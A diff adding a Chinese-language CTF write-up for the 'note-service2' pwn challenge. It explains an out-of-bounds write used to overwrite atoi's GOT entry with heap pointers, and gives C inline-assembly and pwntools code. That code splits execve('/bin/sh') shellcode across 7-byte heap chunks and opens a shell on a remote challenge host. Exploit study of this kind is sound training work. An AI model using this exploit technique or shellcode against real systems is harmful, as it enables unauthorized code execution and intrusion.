@@ -454,3 +454,116 @@ def getShell():
 
 getShell()
 ```
+
+### 11. note-service2
+题目：暂无。
+
+思路：漏洞点在于全局数据存在越界访问的漏洞，可以在任意地址写入一个malloc分配的地址，且地址指向的内容可控。利用方法是修改某个函数的got表内容，使其指向新分配的地址，内容为需要执行的shellcode指令。此方法需要两个条件，一是Partial RELRO，即可修改got表，二是NX disabled，即堆栈数据可以执行。
+
+先使用checksec检查程序是否满足利用条件。剩下就是构造shellcode，主要难点在于每次分配的内存空间只能写入7个字节的有效内容，需要将shellcode拆分成几段，然后利用jmp指令将几段shellcode连起来执行，因此计算jmp跳转的偏移是shellcode的关键之处。我这里使用的方法是通过linux的内联汇编编写shellcode，然后使用nop指令模拟堆的头结构和填充内容，cc编译时会自动计算偏移，再通过gdb反汇编得到shellcode。生成shellcode的c代码如下：
+```c
+int main(){
+        char s[] = "/bin/sh";
+        char *a = s;
+        asm(
+                        "mov %0, %%rdi;"
+                        "jmp shellcode2;"
+                        "shellcode0:"
+                        "xor %%rax, %%rax;"
+                        "mov $59, %%al;"
+                        "syscall;"
+                        "nop;"
+                        // padding of chunk0
+                        "nop;nop;nop;nop;nop;nop;nop;nop;"
+
+                        // head of chunk1
+                        "nop;nop;nop;nop;nop;nop;nop;nop;"
+                        "nop;nop;nop;nop;nop;nop;nop;nop;"
+                        "shellcode1:"
+                        "xor %%rdx, %%rdx;"
+                        "jmp shellcode0;"
+                        "nop;nop;nop;"
+                        // padding of chunk0
+                        "nop;nop;nop;nop;nop;nop;nop;nop;"
+
+                        // head of chunk1
+                        "nop;nop;nop;nop;nop;nop;nop;nop;"
+                        "nop;nop;nop;nop;nop;nop;nop;nop;"
+                        "shellcode2:"
+                        "xor %%rsi, %%rsi;"
+                        "jmp shellcode1;"
+                        :"=r"(a)
+               );
+}
+```
+
+获取flag的程序如下：
+```python
+from pwn import *
+
+# shellcode
+# xor rsi, rsi; 48 31 f6
+# xor rdx, rdx; 48 31 d2
+# xor rax, rax; 48 31 c0
+# mov al, 59;   b0 3b
+# syscall;      0f 05
+
+# shellcode需要布置在三个堆块上
+# 从后面的堆块往前执行
+# 第一个堆块
+# 堆头16字节
+# 数据8字节（实际只能写7字节，最后一个字节被程序填0）
+# xor rax, rax
+# mov al, 59
+# syscall
+shellCode0 = b'\x48\x31\xc0' + b'\xb0\x3b' + b'\x0f\x05'
+# 堆尾用于对齐的填充8个字节（堆块大小是32字节对齐的）
+
+# 第二个堆块，最后跳转到第一个堆块
+# 堆头16字节
+# 数据8字节（实际只能写7字节，最后一个字节被程序填0）
+# 跳转的距离为：本块的两条指令共5个字节 + 堆头16字节 + 上一个堆块填充8字节 + 上一个堆块的数据8字节
+# 也就是堆块的大小32字节+本块两条指令5字节共37字节
+# 但是由于是往前跳转的，因此为-37，转换成单字节为db
+# 负数转十六进制字节的方法
+# 转原码: 1010 0101 符号为1 剩余部分为37
+# 转反码: 1101 1010 符号不变 剩余取反
+# 转补码: 1101 1011 加1
+# xor rdx, rdx
+# jmp shellCode0
+# 补齐7个字节，根据程序逻辑，写内容时最多读取长度-1个字节，因此发送内容时不需要发送换行符
+shellCode1 = b'\x48\x31\xd2' + b'\xeb\xdb' + b'\x90\x90'
+# 堆尾用于对齐的填充8个字节（堆块大小是32字节对齐的）
+
+# 第三个堆块，最后跳转到第二个堆块
+# xor rsi, rsi
+# jmp shellCode1
+shellCode2 = b'\x48\x31\xf6' + b'\xeb\xdb' + b'\x90\x90'
+
+atoiGot = 0x202060
+qword_2020A0 = 0x2020A0
+index = (atoiGot - qword_2020A0) / 8
+log.success('index: %d' % index)
+
+sh = remote('220.249.52.133', 37999)
+
+def createNote(index, code):
+    sh.recvuntil('>> ')
+    sh.sendline('1')
+    sh.recvuntil('index:')
+    print('index: %d' % index)
+    sh.sendline('%d' % index)
+    sh.recvuntil('size:')
+    sh.sendline('8')
+    sh.recvuntil('content:')
+    # 不能使用sendline,否则输入输出的字节数量对不上，会导致出错
+    sh.send(code)
+
+createNote(1, shellCode0)
+createNote(2, shellCode1)
+createNote(index, shellCode2)
+data = sh.recvuntil('>> ')
+print(data)
+sh.sendline('/bin/sh')
+sh.interactive()
+```
